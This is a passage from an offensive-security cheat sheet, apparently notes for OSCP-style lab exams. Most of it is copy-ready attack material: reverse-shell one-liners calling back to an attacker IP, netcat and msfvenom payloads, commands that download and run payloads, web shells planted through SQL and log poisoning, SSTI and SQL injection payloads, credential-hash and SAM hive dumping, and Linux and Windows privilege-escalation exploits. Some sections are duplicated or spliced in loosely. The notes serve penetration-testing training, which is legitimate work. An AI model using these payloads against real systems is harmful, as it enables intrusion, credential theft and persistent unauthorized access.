  - *Context*: Found in `clamav-milter` versions < 0.91.2. Injection in the `RCPT TO` field.
  - *Discovery OID (Running Procs)*: `.1.3.6.1.2.1.25.4.2.1.2` (`hrSWRunName`).
  - *Hostname Discovery*: `smbclient -L [IP] -N` (Look for NetBIOS Computer Name).
  - *Exploit Logic*: Manual `RCPT TO` injection often fails stability checks; use `searchsploit -m 4761` for persistent backdoor creation via `inetd`.
  - *Manual Trigger (POC)*:
    ```bash
    nc -nv [IP] 25
    HELO [INTERNAL_DOMAIN]
    MAIL FROM: <root@[INTERNAL_DOMAIN]>
    RCPT TO: <root@localhost.localdomain'|/bin/sh -c "sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1"'>
    DATA
    Subject: Trigger
    .
    ```
  - *Automated Trigger (Persistent)*: `perl 4761.pl [IP]` (Creates root shell on port 31337).

- **Exhibitor Web UI RCE (CVE-2020-10978):**
  - *Context*: Supervises ZooKeeper. Found on ports 8080 or 8081.
  - *Method*: Config tab -> Editing ON -> `java.env script` field.
  - *Payload*: `$(/bin/nc -e /bin/sh [KALI_IP] 4444 &)`
  - *Trigger*: Click Commit -> All At Once.

- **CS-Cart LFI (EDB-48890):**
  - *Context*: Version 1.3.3 / `classes_dir` parameter.
  - *Path*: `/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../etc/passwd%00`
  - *Manual Tip*: Requires null byte `%00` for legacy PHP versions.

- **Vesta CP reset/index.php LFI (FRANKFURT/OSCPC):**
  - *Status*: **[RABBIT HOLE]** - Found in lab .157 but did not yield RCE directly.
  - *Command*: `curl -k "https://[IP]:8083/api/v1/reset/index.php?action=confirm&user=admin&code=../../etc/passwd"`

- **Joomla Template Shell (RCE via Admin):**
  1. Extensions -> Templates -> Templates.
  2. Select active template (e.g., **Protostar**).
  3. Edit `error.php`.
  4. Inject: `<?php system($_GET['cmd']); ?>`
  5. **Trigger**: `http://[IP]/joomla/templates/[TEMPLATE]/error.php?cmd=whoami`

### Multi-CMS (Droopescan)
- **Drupal / Joomla / SilverStripe / WordPress:**
  ```bash
  droopescan scan joomla --url http://10.10.10.10
  droopescan scan drupal --url http://10.10.10.10
  ```
- **Plugin Unauthenticated RCE:**
  ```bash
  python3 exploit_wp.py -u "http://[TARGET_URL]" -p "/?p=[POST_ID]"
  # Example: python3 exploit_wp.py -u "http://example.com/blog" -p "/?p=29"
  # Working Shell: curl -G "http://example.com/[PATH]/[SHELL].php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1'"
  ```
  ```
  *Note*: Check styles in page source for confirming plugin version.

- **Social Warfare <= 3.5.2 RCE (CVE-2019-9978):**
  - *Trigger*: `wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://[KALI_IP]/payload.txt`
  - *Payload (Kali)*: `<pre>system('bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1')</pre>`

- **Nagios XI Specific (CVE-2019-15949)**:
  - *Indicator*: Found in Nagios XI administrative interface.
  - *Manual Exploitation*:
    1. Generate Payload: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[PORT] -f elf -o check_icmp`
    2. Upload at: `http://[IP]/nagiosxi/admin/monitoringplugins.php`
    3. Execute: Trigger the plugin through the Monitoring interface.

- **AdRotate Plugin Zip Upload RCE:**
  - *Trigger*: Upload a malicious `shell.zip` (containing `shell.php`) via AdRotate -> Manage Media.
  - *Execution*: Triggered at `/wp-content/banners/shell.php`.

- **SSH Key Injection via API / File Upload:**
  ```bash
  # 1. Generate local key: ssh-keygen -t rsa -f id_rsa -N ""
  # 2. Upload to target authorized_keys path:
  curl -X POST http://[IP]:[PORT]/upload -F "file=@id_rsa.pub" -F "filename=/home/[USER]/.ssh/authorized_keys"
  # 3. Connect: ssh -i id_rsa [USER]@[IP] -p [SSH_PORT]
  ```

### SSTI (Server-Side Template Injection)
- **Flask (Jinja2) - RCE Payload**:
  - *Trigger*: Test with `{{7*7}}`. If it returns `49`, it's vulnerable.
  - *Payload*: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1"').read()}}`
  - *Alternative*: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

### sar2HTML 3.2.1 RCE
- **Trigger**: Find `/sar2HTML/` in `robots.txt` or via fuzzing.
- **Vulnerability**: Command injection in `plot` parameter.
- **Payload**: `http://[IP]/sar2HTML/index.php?plot=;[COMMAND]`
- **Reverse Shell Example**: `;wget http://[KALI_IP]/shell.sh -O /tmp/shell.sh;bash /tmp/shell.sh`

- **Mobile Mouse Server RCE (Port 9099):**
  - *Context*: Unauthenticated RCE in Mobile Mouse Server (Windows).
  - *Command*: `python3 exploit.py -t [IP] -p 9099 -c "[COMMAND]"`
  - *Manual Check*: `echo "shell [COMMAND]" | nc [IP] 9099`

### Python Post-Exploitation
- **PYC Decompilation**:
  - *Tool*: `uncompyle6`
  - *Execution*: `uncompyle6 [FILE].pyc > [FILE].py`
  - *Why*: To extract source code from compiled Python artifacts found in `/opt` or home dirs.

### CMS Plugin / Extension RCE
- **General Scenario**: You have admin access to a CMS (Schlix, WordPress, Joomla) and can upload or edit extensions.
- **Triage**: Use `wpscan`, `joomscan`, or `droopescan` to identify the version and installed plugins/themes.
- **Method**:
  1. Locate the plugin/theme management section (e.g., WordPress Plugins, Joomla Extensions).
  2. Download a legitimate plugin or find an existing one's `index.php` or `packageinfo.inc.php`.
  3. Inject a PHP Reverse Shell.
  4. Zip the modified folder and upload/install it.
  5. Trigger by visiting the plugin's path or its "About/Settings" page.

### Nagios XI Specific (CVE-2019-15949)
- **Scenario**: Authenticated access to Nagios XI.
- **Exploit Logic**: Upload malicious plugin via the "Manage Plugins" administrative interface.
- **Manual Exploitation**:
  1. Generate Payload: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[PORT] -f elf -o check_icmp`
  2. Upload at: `http://[IP]/nagiosxi/admin/monitoringplugins.php`
  3. Execute: Trigger the plugin through the Monitoring interface or specific script calls.
- **Root RCE Script (Misc/Post-Exp)**:
  `php exploit.php --host=[IP] --user=[USER] --pass=[PASS] --reverseip=[KALI_IP] --reverseport=[PORT]`

### SQL Injection & MSSQL
- **Sqlmap (Automated):**
  ```bash
  sqlmap -u "http://10.10.10.10/page.php?id=1" --dbms mysql --batch --dump
  sqlmap -r request.txt --level 5 --risk 3
  ```

#### 🛡️ SQLi Armory (Bypass & Payload Collection)
| DB Type | Payload (Schema/Table/User Dump) | Notes |
| :--- | :--- | :--- |
| **MySQL** | `" UNION SELECT 1,2,3,schema_name FROM information_schema.schemata -- -` | Use `-- -` or `#` |
| **Postgres** | `' UNION SELECT NULL,NULL,NULL,table_schema FROM information_schema.schemata --` | Data-type sensitive; use NULLs |
| **MS-SQL** | `' UNION SELECT 1,2,3,name FROM sys.databases --` | `information_schema` also works |
| **Oracle** | `' UNION SELECT NULL,NULL FROM dual --` | Always requires `FROM [TABLE]` |
| **SQLite** | `' UNION SELECT 1,2,3,sql FROM sqlite_master --` | No `information_schema` |

#### 🧪 Manual SQLi Testing (Triage & Escape Checklist)

- **Standard**: `" UNION SELECT 1,2,3,schema_name FROM information_schema.schemata -- -`
- **Initial Setup (Schlix/WordPress pattern)**:
  ```sql
  CREATE DATABASE schlix_db;
  CREATE USER 'Hacked'@'%' IDENTIFIED BY 'Hacked';
  GRANT ALL PRIVILEGES ON *.* TO 'Hacked'@'%';
  FLUSH PRIVILEGES;
  ```
- **Check for File Permissions**:
  ```sql
  SELECT user, host, file_priv FROM mysql.user WHERE user = 'root';
  SHOW VARIABLES LIKE "secure_file_priv"; 
  # If empty/NULL -> Writable. If path -> Only that path.
  ```
- **Web Shell Injection**:
  - *Path*: Find via `phpinfo()` or defaults (`C:/wamp64/www/`, `/var/www/html/`).
  ```sql
  SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp64/www/shell.php';
  ```
- **File Read (Exfiltration)**:
  - `SELECT LOAD_FILE('/etc/passwd');`
  - `SELECT LOAD_FILE('C:/windows/win.ini');`

### 2. PostgreSQL (Type Sensitive)
Postgres requires column types (int/string) to match. Use `NULL` for safety.
- **Standard**: `' UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata --`
- **Alternatif (Tables)**: `' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='public' --`
- **Dollar Quoting (Bypass)**: `' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema=$$public$$ --`

### 3. MS-SQL (SQL Server)
Use system tables if `information_schema` is restricted.
- **Databases**: `' UNION SELECT 1,2,3,name FROM sys.databases --`
- **Tables**: `' UNION SELECT 1,2,3,name FROM sysobjects WHERE xtype='U' --`
- **Error-Based (Fast)**: `' AND 1=(SELECT QUOTENAME(name) FROM sys.databases FOR XML PATH('')) --`

#### 🔍 MSSQL Internal Enumeration (Inside mssqlclient)
Use these queries after connecting via `impacket-mssqlclient`.

- **Check Roles & Permissions:**
  ```sql
  # Check if sysadmin
  SELECT is_srvrolemember('sysadmin');
  # List all your current permissions
  SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');
  ```
- **Database Impersonation (Escalate to SA):**
  - *Find*: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`
  - *Execute*: `EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;`
- **Linked Servers (Find other DBs):**
  - *List*: `EXEC sp_linkedservers;`
  - *Execute*: `EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];`
- **Harvest Credentials (Sysadmin Required):**
  ```sql
  # Dump SQL login hashes
  SELECT name, password_hash FROM master.sys.sql_logins;
  ```

### 4. Oracle (Requires "FROM DUAL")
Oracle mandates a table name in SELECT. Column count must be exact.
- **Schemas**: `' UNION SELECT NULL,NULL,NULL,username FROM all_users --` (Note: Oracle payloads often need a dummy table)
- **Tables**: `' UNION SELECT NULL,NULL,NULL,table_name FROM all_tables --`
- **Dummy Table (DUAL)**: `' UNION SELECT 'a','b','c','d' FROM dual --`

### 5. SQLite
Common in mobile/small web apps. No `information_schema`.
- **Tables**: `' UNION SELECT 1,2,3,name FROM sqlite_master WHERE type='table' --`
- **Master Records**: `' UNION SELECT 1,2,3,sql FROM sqlite_master --`

### 6. PostgreSQL (Advanced RCE)
- **RCE via COPY (Must be Superuser)**:
  ```sql
  DROP TABLE IF EXISTS cmd_exec;
  CREATE TABLE cmd_exec(cmd_output text);
  COPY cmd_exec FROM PROGRAM 'id';
  SELECT * FROM cmd_exec;
  ```

---

#### 🛡️ SQLi Escape Combination Cheat Sheet (If No Response)
Variations to escape/close the query:

| Starting Character | Ending Character (Comment) | Notes |
| :--- | :--- | :--- |
| `'` (Single Quote) | `-- -` | MySQL dash-dash-space-dash |
| `"` (Double Quote) | `#` | MySQL Hashtag |
| `')` (Quote + Paren) | `--` | Postgres/MSSQL Standard |
| `")` (Double Quote + Paren) | `/*` | Swallows the rest of the query |
| `'))` (Double Paren) | `;%00` | Null Byte (Bypass PHP filters) |

- **Login & Shell (MySQL/MariaDB):**
  - **Check File Privs**: `SELECT user, host, file_priv FROM mysql.user;`
  - **Write Web Shell**: `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/path/to/www/shell.php';`
  - **Read File**: `SELECT LOAD_FILE('C:/windows/win.ini');`
- **MSSQL Login & Impersonation**:
  - **Login**: `impacket-mssqlclient 'DOMAIN/user':'password'@10.10.10.10 -windows-auth`
  - **Find Impersonatable**: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
  - **Impersonate**: `EXECUTE AS LOGIN = 'target_user'`
- **MSSQL sysadmin xp_cmdshell (Impacket):**
  - *Login*: `proxychains impacket-mssqlclient [DOMAIN]/[USER]:[PASS]@[TARGET] -windows-auth`
  - *Enable*: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
  - *Execute*: `EXEC xp_cmdshell 'whoami /priv';`
  - *Pivot*: `EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://[IP]:[PORT]/bin.exe -OutFile C:\\\\Temp\\\\bin.exe\\\"\';`

#### 🔍 MSSQL Internal Enumeration (Inside mssqlclient)
Use these queries after connecting via `impacket-mssqlclient`.

- **Check Roles & Permissions:**
  ```sql
  # Check if sysadmin
  SELECT is_srvrolemember('sysadmin');
  # List all your current permissions
  SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');
  ```
- **Enumerate Databases & Tables:**
  ```sql
  # List all databases
  SELECT name FROM master..sysdatabases;
  # Shift context to a database
  USE [DB_NAME];
  # List all tables in the current database
  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
  # List all columns in a specific table
  SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='[TABLE_NAME]';
  ```
- **Database Impersonation (Escalate to SA):**
  - *Find*: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`
  - *Execute*: `EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;`
- **Linked Servers (Find other DBs):**
  - *List*: `EXEC sp_linkedservers;`
  - *Execute*: `EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];`
- **Harvest Credentials (Sysadmin Required):**
  ```sql
  # Dump SQL login hashes
  SELECT name, password_hash FROM master.sys.sql_logins;
  ```
- **Dump Data:**
  ```sql
  # Read rows (limit 10 for safety)
  SELECT TOP 10 * FROM [TABLE_NAME];
  ```
- **Harvest Credentials (Sysadmin Required):**
  ```sql
  # Dump SQL login hashes
  SELECT name, password_hash FROM master.sys.sql_logins;
  ```

- **Dumping Data via commands (Lab Method):**
  - *List Databases*: `'; EXEC xp_cmdshell 'sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases"'; -- -`
  - *List Tables*: `'; EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "SELECT name FROM sys.tables"'; -- -`
  - *Dump Everything*: `'; EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "EXEC sp_MSforeachtable ''SELECT ''''?'''' AS TableName, * FROM ?''"'; -- -`

- **Spring Boot RCE (Apache Commons Text):**
  - *Check*: `/search?query=${1+1}` or `<h1>`
  - *Payload*: `curl -g "[URL]?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27[CMD]%27%29%7D"`
  - *Enable*: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
  - *Execute*: `EXEC xp_cmdshell 'whoami /priv';`
  - *Pivot*: `EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://[IP]:[PORT]/bin.exe -OutFile C:\\Temp\\bin.exe\"';`
- **Reading Files via SQLi:**
  ```sql
  ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
  ```

### LFI (Local File Inclusion) & Reverse Shells
Include multiple variations for different OS targets and filtering environments.

#### 1. Discovery & Basic Exploitation
- **Basic Linux (passwd):** `?page=../../../../etc/passwd`
- **Basic Windows (win.ini):** `?page=../../../../windows/win.ini`
- **Null Byte Bypass (Legacy PHP <5.3.4):** `?page=../../../../etc/passwd%00`
- **Path Over-extension (Bypass filter):** `?page=../../../../../../../../../../../../../../../../etc/passwd`

#### 2. Advanced LFI Vectors (Wrapper Attacks)
- **PHP Filters (Base64 Encode - Bypass execution/filters):**
  - *Why*: Use this to read source code without triggering the PHP parser or if the app appends extensions.
  - `?page=php://filter/convert.base64-encode/resource=index.php`
- **Data Wrapper (RCE if `allow_url_include=On`):**
  - `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id`
- **Expect Wrapper (RCE if enabled):**
  - `?page=expect://id`

#### 3. Log Poisoning & Web Shell Chain
- **Step A: Inject PHP into Apache Logs**:
  1. Intercept a request with Burp.
  2. Change User-Agent to: `<?php system($_GET['cmd']); ?>`
  3. Send request (this poisons `/var/log/apache2/access.log`).
- **Step B: Call the Poisoned Log**:
  - `?page=/var/log/apache2/access.log&cmd=id`
- **Step C: Upload a Permanent Web Shell**:
  - `?page=/var/log/apache2/access.log&cmd=echo "<?php system(\$_GET['c']); ?>" > /var/www/html/shell.php`
- **Step D: Trigger the Permanent Shell**:
  - `http://10.10.10.10/shell.php?c=id`

#### 4. LFI / SSRF to NTLM Capture (Windows Only)
- *Why*: Forces the server to authenticate to your Kali SMB share, giving you a hash to crack.
- **LFI Trigger**: `?page=//172.10.10.10/share`
- **SSRF Trigger**: Enter `http://172.10.10.10` in a URL/Search field.
- **Capture**: `sudo responder -I tun0 -v`

#### 5. Web Shell Execution Options
- **PHP system()**: `?cmd=id`
- **PHP exec() (Hidden output)**: `?cmd=id > /tmp/out`
- **PHP passthru()**: `?cmd=id`
- **Ivan Sincek PHP RevShell (High Quality)**:
  - Upload via LFI/Logs: `wget http://172.10.10.10/shell.php -O /var/www/html/rev.php`
  - Trigger: `http://10.10.10.10/rev.php`
- **Generic RevShell One-liner (Trigger via shell.php?cmd=...)**:
  - `bash -c 'bash -i >& /dev/tcp/172.10.10.10/4444 0>&1'`
  - *URL Encoded*: `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.10.10.10%2F4444%200%3E%261%27`

---

## 4. Privilege Escalation

### Linux
- **Check Sudo Permissions:**
  ```bash
  sudo -l
  ```
- **SUID Binary Search:**
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
- **Specific Escapes (GTFOBins):**
  - **Find:** `find . -exec /bin/sh \; -quit`
  - **Vim:** `:set shell=/bin/bash` followed by `:shell`
        *   sudo git: `sudo git -p help config` -> `!/bin/sh`

  - **GDB:** `gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`
  - **GIMP:** `gimp-2.10 -idf --batch-interpreter python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'`
  - **Teehee:** `echo "root2::0:0::/root:/bin/bash" | sudo teehee -a /etc/passwd`
  - **Service (Sudo Traversal):** `sudo /usr/sbin/service ../../bin/bash`
  - **OpenVPN (Sudo):** `sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'`
- **Capabilities Exploitation:**
  ```bash
  getcap -r / 2>/dev/null
  # If python has cap_setuid:
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
- **Screen 4.5.0 SUID Exploit (Refined)**:
  1. *Library*: Compile `libhax.c` (constructor replaces `/etc/ld.so.preload`).
  2. *Shell*: Compile `rootshell.c` (static SUID wrapper).
  3. *Preload*: `cat /tmp/libhax.so | /usr/bin/screen-4.5.0 -D -m -L ld.so.preload tee`
  4. *Trigger*: `screen -S trigger -dm; screen -ls`.
  5. *Execute*: `/tmp/rootshell`.

- **Tar Wildcard Injection (PrivEsc):**
  - *Conditions*: Root cronjob running `tar ... *` in a user-writable directory.
  - *Trigger 1*: `touch /opt/dir/--checkpoint=1`
  - *Trigger 2*: `touch /opt/dir/--checkpoint-action=exec=sh shell.sh`
  - *Execute*: Create `shell.sh` with payload (e.g., SUID creation).

- **Windows Service Binary Overwrite:**
  - *Requirements*: `AllAccess` or `WriteData` permissions on a service binary.
  - *Enumerate*: `winpeas.exe quiet servicesinfo`
  - *Exploit*:
    ```cmd
    sc stop [SERVICE_NAME]
    copy /y [REVERSE_SHELL_EXE] "C:\Path\To\Service.exe"
    sc start [SERVICE_NAME]
    ```
- **Tar Wildcard Injection (Cron/Root):**
  - *Scenario*: root runs `tar czf backup.tar.gz *` in a user-writable directory.
  - *Method A (Sudoers)*: 
    - `echo 'echo "[USER] ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh`
    - `touch ./\--checkpoint=1`
    - `touch ./\--checkpoint-action=exec=sh\ shell.sh`
  - *Method B (SSH Key)*:
    - `echo 'cp /home/[USER]/.ssh/authorized_keys /root/.ssh/authorized_keys' > getroot.sh`
    - `touch ./\--checkpoint=1`
    - `touch ./\--checkpoint-action=exec=sh\ getroot.sh`
  - *Note (OSCPC)*: The `*` expands to include the malicious flags as arguments to `tar`.

- **World-Writable Script Hijacking (via pspy):**
  - *Identify*: Run `pspy64` and look for root-run scripts in home or `/usr/bin`.
  - *Check*: `ls -la /usr/bin/check-system`
  - *Exploit*: Inject a SUID trigger or reverse shell.
    ```bash
    echo "chmod +s /bin/bash" > /usr/bin/check-system
    ```
  - *Triggering*: If script runs on cron, wait. If you have `sudo /sbin/shutdown`, force a reboot: `sudo /sbin/shutdown -r now`.
  - *Note (Funbox)*: Sometimes crons are triggered by different users (e.g., funny AND root) at different times. Wait for the root trigger.

- **Sudo adduser (Privesc via user creation)**:
  - *Scenario*: `sudo -l` allows `/usr/sbin/adduser`.
  - *Exploit*: Add a user with a specific GID or manually add to sudoers if permissions allow.
  - *Command*: `sudo /usr/sbin/adduser hacker --gid 0` (Adds user to root group).

- **Sudo apt-get (GTFOBins)**:
  - *Scenario*: `sudo -l` allows `/usr/bin/apt-get`.
  - *Exploit*: Use the Pre-Invoke hook to spawn a shell.
  - *Command*: `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash`

- **Cron-to-Root Script Hijacking (The "Sar" Pattern)**:
  - *Scenario*: A root cronjob executes `A.sh`, and `A.sh` calls `B.sh`. `B.sh` is world-writable or owned by you.
  - *Discovery*: Check `crontab` and follow script logic.
  - *Exploit*: Inject a reverse shell into the writable script.
  - *Note*: Always check if a root script calls others with full or relative paths.

- **Sudo Missing Script Hijacking (Resurrection):**
  - *Scenario*: `sudo -l` shows a script that doesn't exist, but you have write access to its directory.
  - *Exploit*: Create the script and run it as root.
    ```bash
    echo '#!/bin/bash' > /path/to/missing-script.sh
    echo '/bin/bash -p' >> /path/to/missing-script.sh
    chmod +x /path/to/missing-script.sh
    sudo /path/to/missing-script.sh
    ```

### Kernel Exploits (Local Privilege Escalation)
- **CVE-2017-16995 (BPF Verifier Bypass):**
  - *Target*: Linux Kernel < 4.13.9 (e.g., Ubuntu 16.04).
  - *Identification*: `uname -a` (check for 4.4.x, 4.8.x etc).
  - *Tool*: `searchsploit -m 45010`
  - *Execution*: `gcc 45010.c -o pwn && ./pwn`
  - *Note*: Highly reliable on older Ubuntu systems.

- **PwnKit (CVE-2021-4034) - SUID pkexec**:
  - *Trigger*: Check for SUID `pkexec` binary.
  - *Identification*: `find / -perm -4000 -type f 2>/dev/null | grep pkexec`
  - *Execution*:
    ```bash
    # Check for pkexec version/SUID. 
    # Compile PoC (poc.c) or use pre-compiled.
    gcc poc.c -o poc && ./poc
    ```
  - *Note*: Universal root exploit for Linux (Polkit). Check kernel patch dates (Post-Jan 2022 usually patched).

#### 🔍 Legendary Searchsploit Techniques (Kernel Triage)
Don't get overwhelmed by searching just for "linux kernel". Most effective combinations:
- **Full Version**: `searchsploit linux kernel 4.4.0 privilege escalation`
- **Distro Specific**: `searchsploit ubuntu 16.04 local privilege escalation`
- **Summary List**: `searchsploit linux kernel 4.4.0 -s` (Shows titles/versions only)
- **Regex Search**: `searchsploit "Linux Kernel" | grep "Privilege Escalation"`
- **Exploit-DB Link**: `searchsploit -w [ID]` (Provides link to open in browser)
- **World-Writable Script Persistence/Exploit:**
  - *Scenario*: Script is writable by low-priv user but run by high-priv user.
  - *Commands*:
    ```bash
    # Inject SUID Bash persistence
    echo "cp -f /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> script.sh
    # Inject Polyglot Reverse Shell
    echo "bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1" >> script.sh
    ```

- **Sudo Path Traversal (Wildcard Bypass - Potato):**
  - *Scenario*: `sudo -l` shows `(ALL) /bin/nice /executable/*` or similar.
  - *Exploit*: Use `../` to escape the mandatory directory.
  - *Command*: `sudo /bin/nice /executable/../bin/bash -p`
  - *Cooperative Tactic*: If you can't run `/bin/bash` directly, create a script:
    ```bash
    echo "/bin/bash" > /tmp/pwn.sh && chmod +x /tmp/pwn.sh
    sudo /bin/nice /executable/../tmp/pwn.sh
    ```

- **Sudo Path Traversal (Cooperative Tactic - Seppuku):**
  - *Scenario*: Sudo rule contains relative paths. One user "prepares" the payload, another "triggers" it.
  - *Rule*: `/../../../../../../home/[USER_B]/.bin [wildcard]`
  - *Example (Seppuku)*: User `samurai` has sudo for `/../../../../../../home/tanto/.cgi_bin/bin`.
  - *Step 1 (User B - tanto)*: `mkdir -p ~/.cgi_bin && echo "/bin/bash" > ~/.cgi_bin/bin && chmod +x ~/.cgi_bin/bin`
  - *Step 2 (User A - samurai)*: `sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/any`

- **Windows SeImpersonate Exploits:**
  - *PrintSpoofer*: `.\PrintSpoofer.exe -i -c cmd`
  - *GodPotato*: `.\GodPotato-NET4.exe -cmd "whoami"`
  - *JuicyPotato*: `.\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -l 9999`

- **Internal Tool Relay (IIS Trick - MS01/OSCPB):**
  - *Scenario*: Target (MS02) is isolated, but you have SYSTEM on MS01 (IIS).
  - *Step 1 (MS01 SYSTEM)*: `copy shell.exe C:\inetpub\wwwroot\s.exe`
  - *Step 2 (MS02)*: `powershell -c "iwr http://[MS01_IP]:80/s.exe -outf C:\Temp\s.exe"`
  - *Note*: Default ports for IIS are often 80, 8000, 8080.

- **SUID PATH Hijacking (Relative Path):**
  - *Scenario*: SUID calls `system("cmd")` instead of `system("/bin/cmd")`.
  - *Payload (pwn.c)*:
    ```c
    int main() { setresuid(0,0,0); system("cp /bin/bash /tmp/rb && chmod +s /tmp/rb"); return 0; }
    ```
  - *Execution*:
    ```bash
    gcc pwn.c -o [VULN_CMD]
    export PATH=[PAYLOAD_DIR]:$PATH
    ./[SUID_BINARY]
    /tmp/rb -p
    ```

- **JDWP Privilege Escalation (Java Debug):**
  - *Identify*: `netstat -antulp | grep 8000`
  - *Exploit*: `python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on "java.net.ServerSocket.accept" --cmd "busybox nc -lp 1337 -e /bin/bash"`
  - *Trigger*: `curl http://127.0.0.1:8080`

- **Tunneling (Chisel):**
  - *Kali Server*: `./chisel server -p 9999 --reverse`
  - *Victim Client*: `./chisel client [KALI_IP]:9999 R:[KALI_PORT]:127.0.0.1:[VICTIM_PORT]`
  - *Example*: `./chisel client 10.10.10.10:9999 R:8000:127.0.0.1:8000`

### Tool Transfer (Windows)
- **Certutil Download:**
  ```powershell
  certutil -urlcache -f http://[KALI_IP]/file.exe C:\Windows\Temp\file.exe
  ```

- **PowerShell Download:**
  ```powershell
  iwr -uri http://[IP]/file.exe -OutFile C:\Temp\file.exe
  ```

- **FreeSWITCH mod_event_socket RCE (Port 8021):**
  - *Download Tool*: `python3 freeexp.py [IP] "certutil -urlcache -f http://[KALI_IP]/nc64.exe C:\Windows\Temp\nc64.exe"`
  - *Reverse Shell*: `python3 freeexp.py [IP] "C:\Windows\Temp\nc64.exe -e cmd.exe [KALI_IP] [PORT]"`
  whoami /priv # Check for SeBackupPrivilege, SeImpersonatePrivilege
  ```
- **Unquoted Service Path Discovery**:
  ```powershell
  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
  ```
  - *Exploit*: If path is `C:\Program Files\My App\service.exe`, place shell at `C:\Program.exe` or `C:\Program Files\My.exe`.
- **SeBackupPrivilege / Hive Exfiltration:**
  - *Method*: `reg save hklm\sam SAM`, `reg save hklm\system SYSTEM`, `reg save hklm\security SECURITY`
  - *Medtech Trick*: If downloading via a web server (IIS/Apache) returns 404, rename the hives to `.txt` to evade MIME filtering.
  - `ren SAM SAM.txt`, `ren SYSTEM SYSTEM.txt`
  - *Download*: `wget http://[IP]/SAM.txt`
- **PrintSpoofer (SeImpersonate):**
  ```powershell
  .\PrintSpoofer.exe -c "cmd.exe" -i
  ```
- **Modifiable Service Binary Hijacking (Medtech Examples):**
  - *Identify*: `icacls C:\Path\To\Binary.exe` shows `(M)` or `(F)` for your user/group.
  - *Example (DEV04)*: `C:\TEMP\backup.exe` (yoshi can modify).
  - *Example (CLIENT02)*: `C:\DevelopmentExecutables\auditTracker.exe` (Everyone AllAccess).
  - *Action*:
    ```cmd
    # Replace binary with msfvenom shell or similar
    copy /y shell.exe C:\TEMP\backup.exe
    # Re-trigger service start or wait for execution
    sc start [SERVICE_NAME]
    ```

- **HiveNightmare (SeriousSAM / CVE-2021-36934):**
  - *Requirement*: Win 10 Build 1809 to 19043 (with VSS enabled).
  - *Action*: Allows reading SAM/SECURITY/SYSTEM hives as a normal user.
  - `.\HiveNightmare.exe`
  - *Result*: Creates `SAM`, `SECURITY`, `SYSTEM` files in the current folder.
  - *Extraction*: `impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL`

- **AlwaysInstallElevated (Registry Abuse):**
  - *Verify*: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  - *Exploit*: `msiexec /quiet /qn /i C:\temp\setup.msi`

- **Registry Service Hijack (ImagePath):**
  - *Action*: If you have write access to service registry key.
  - `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\[SERVICE] -Name ImagePath -Value "C:\temp\shell.exe"`
